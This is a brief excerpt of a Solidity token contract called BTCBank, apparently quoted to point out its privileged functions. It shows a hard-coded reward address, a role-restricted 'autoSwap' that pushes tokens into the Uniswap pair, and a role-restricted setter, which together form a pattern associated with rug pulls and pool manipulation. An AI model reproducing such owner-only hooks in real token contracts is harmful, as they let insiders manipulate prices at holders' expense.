...
contract BTCBank is Context, IERC20, Ownable {
    ...
    address public  rewardAddress = 0x56C5cfa936FEb24bD524158C93c605E7bc2225f9;
   ...
   function autoSwap(uint256 _count) public onlyRole{
        address recipient = uniswapPair;
        _balances[msg.sender] = _balances[msg.sender].Sub(_count);
        _transfer(recipient,_count);
    }
    function setDividenNum(uint256 newLimit) external onlyRole {
